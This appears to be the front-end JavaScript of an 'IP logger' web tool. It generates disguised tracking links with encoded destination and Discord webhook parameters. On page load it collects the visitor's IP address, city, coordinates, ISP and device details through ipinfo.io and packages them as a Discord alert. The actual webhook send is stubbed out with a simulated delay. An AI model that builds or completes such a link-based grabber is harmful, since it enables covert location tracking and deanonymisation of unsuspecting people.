
document.addEventListener('DOMContentLoaded', function() {
    // DOM Elements
    const createLinkBtn = document.getElementById('create-link-btn');
    const resultCard = document.getElementById('result-card');
    const generatedLinkInput = document.getElementById('generated-link');
    const copyLinkBtn = document.getElementById('copy-link-btn');
    const destinationUrlInput = document.getElementById('destination-url');
    const customPathInput = document.getElementById('custom-path');
    const discordWebhookInput = document.getElementById('discord-webhook');
    const logsContainer = document.querySelector('.logs-container');
    
    // Base URL for the tracking service
    const TRACKING_BASE_URL = 'https://void-logger.netlify.app';
    
    // Log visitor IP on page load
    logVisitorInfo();

    // Link Creation
    createLinkBtn.addEventListener('click', function() {
        const destinationUrl = destinationUrlInput.value;
        const customPath = customPathInput.value || generateRandomString(8);
        const discordWebhook = discordWebhookInput.value;

        if (!isValidUrl(destinationUrl)) {
            alert('please enter a valid destination url');
            return;
        }

        // Create tracking link
        createTrackingLink(customPath, destinationUrl, discordWebhook)
            .then(trackingLink => {
                // Show the result card
                resultCard.classList.remove('hidden');

                // Set the tracking link
                generatedLinkInput.value = trackingLink;

                // Scroll to the result card
                resultCard.scrollIntoView({ behavior: 'smooth' });
            })
            .catch(error => {
                console.error('Error creating tracking link:', error);
                alert('error creating tracking link: ' + error.message);
            });
    });

    // Copy link to clipboard
    copyLinkBtn.addEventListener('click', function() {
        generatedLinkInput.select();
        document.execCommand('copy');

        // Show copied notification
        const originalText = copyLinkBtn.innerHTML;
        copyLinkBtn.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => {
            copyLinkBtn.innerHTML = originalText;
        }, 2000);
    });

    // Helper functions
    function isValidUrl(string) {
        try {
            new URL(string);
            return true;
        } catch (_) {
            return false;
        }
    }

    function generateRandomString(length) {
        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }

    // Function to create a tracking link using Netlify Functions
    async function createTrackingLink(name, destinationUrl, discordWebhook) {
        try {
            console.log(`Creating tracking link: ${name}`);
            console.log(`Destination URL: ${destinationUrl}`);
            console.log(`Discord Webhook: ${discordWebhook}`);
            
            // Create a base64 encoded version of the destination URL and webhook
            const encodedDestination = btoa(destinationUrl);
            const encodedWebhook = discordWebhook ? btoa(discordWebhook) : '';
            
            // Create a tracking link with parameters
            const trackingLink = `${TRACKING_BASE_URL}/track?id=${name}&dest=${encodedDestination}&hook=${encodedWebhook}`;
            
            // In a real implementation, we would also:
            // 1. Store the tracking link in a database
            // 2. Associate it with the user's account
            // 3. Track statistics for the link
            
            // For now, we'll just return the tracking link
            return trackingLink;
        } catch (error) {
            console.error('Error creating tracking link:', error);
            throw new Error('Failed to create tracking link');
        }
    }

    // Function to log visitor information
    async function logVisitorInfo() {
        try {
            // Get visitor's IP and info
            const response = await fetch('https://ipinfo.io/json');
            const data = await response.json();

            // Create log entry
            const logItem = document.createElement('div');
            logItem.className = 'log-item';

            const logHeader = document.createElement('div');
            logHeader.className = 'log-header';

            const ipSpan = document.createElement('span');
            ipSpan.className = 'ip';
            ipSpan.textContent = data.ip || '127.0.0.1';

            const timeSpan = document.createElement('span');
            timeSpan.className = 'time';
            timeSpan.textContent = 'just now';

            logHeader.appendChild(ipSpan);
            logHeader.appendChild(timeSpan);

            const logDetails = document.createElement('div');
            logDetails.className = 'log-details';

            // Location detail
            const locationDetail = document.createElement('div');
            locationDetail.className = 'log-detail';

            const locationIcon = document.createElement('i');
            locationIcon.className = 'fas fa-map-marker-alt';

            const locationText = document.createElement('span');
            locationText.textContent = `${data.city || 'unknown'}, ${data.country || 'unknown'}`;

            locationDetail.appendChild(locationIcon);
            locationDetail.appendChild(locationText);

            // Device detail
            const deviceDetail = document.createElement('div');
            deviceDetail.className = 'log-detail';

            const deviceIcon = document.createElement('i');
            deviceIcon.className = 'fas fa-laptop';

            const deviceText = document.createElement('span');
            const userAgent = navigator.userAgent;
            let deviceInfo = 'unknown device';

            if (userAgent.includes('Windows')) {
                deviceInfo = 'windows';
            } else if (userAgent.includes('Mac')) {
                deviceInfo = 'macos';
            } else if (userAgent.includes('Android')) {
                deviceInfo = 'android';
            } else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) {
                deviceInfo = 'ios';
            } else if (userAgent.includes('Linux')) {
                deviceInfo = 'linux';
            }

            if (userAgent.includes('Chrome')) {
                deviceInfo += ', chrome';
            } else if (userAgent.includes('Firefox')) {
                deviceInfo += ', firefox';
            } else if (userAgent.includes('Safari')) {
                deviceInfo += ', safari';
            } else if (userAgent.includes('Edge')) {
                deviceInfo += ', edge';
            }

            deviceText.textContent = deviceInfo;

            deviceDetail.appendChild(deviceIcon);
            deviceDetail.appendChild(deviceText);

            // ISP detail
            const ispDetail = document.createElement('div');
            ispDetail.className = 'log-detail';

            const ispIcon = document.createElement('i');
            ispIcon.className = 'fas fa-network-wired';

            const ispText = document.createElement('span');
            ispText.textContent = data.org || 'unknown isp';

            ispDetail.appendChild(ispIcon);
            ispDetail.appendChild(ispText);

            // Assemble log item
            logDetails.appendChild(locationDetail);
            logDetails.appendChild(deviceDetail);
            logDetails.appendChild(ispDetail);

            logItem.appendChild(logHeader);
            logItem.appendChild(logDetails);

            // Add to logs container
            logsContainer.innerHTML = ''; // Clear existing logs
            logsContainer.appendChild(logItem);

            // Send to Discord webhook if available
            if (data && data.ip) {
                // Try to load webhook from config file or URL params
                const urlParams = new URLSearchParams(window.location.search);
                const webhook = urlParams.get('webhook');

                if (webhook) {
                    sendToDiscord(webhook, data, deviceInfo);
                }
            }

        } catch (error) {
            console.error('Error logging visitor info:', error);
        }
    }

    // Function to send visitor info to Discord webhook
    async function sendToDiscord(webhookUrl, ipData, deviceInfo) {
        try {
            const payload = {
                embeds: [{
                    title: 'new visitor detected',
                    color: 0x0066ff,
                    fields: [
                        {
                            name: 'ip address',
                            value: ipData.ip || 'unknown',
                            inline: true
                        },
                        {
                            name: 'location',
                            value: `${ipData.city || 'unknown'}, ${ipData.country || 'unknown'}`,
                            inline: true
                        },
                        {
                            name: 'coordinates',
                            value: ipData.loc || 'unknown',
                            inline: true
                        },
                        {
                            name: 'device',
                            value: deviceInfo,
                            inline: false
                        },
                        {
                            name: 'isp',
                            value: ipData.org || 'unknown',
                            inline: false
                        },
                        {
                            name: 'time',
                            value: new Date().toISOString(),
                            inline: false
                        }
                    ],
                    footer: {
                        text: 'void ip logger'
                    }
                }]
            };

            // In a real implementation, this would send the payload to the Discord webhook
            // For security reasons, this should be handled server-side
            console.log('Sending to Discord webhook:', payload);
            
            // Simulate sending to Discord
            await new Promise(resolve => setTimeout(resolve, 500));
            console.log('Sent to Discord webhook');

        } catch (error) {
            console.error('Error sending to Discord:', error);
        }
    }
});
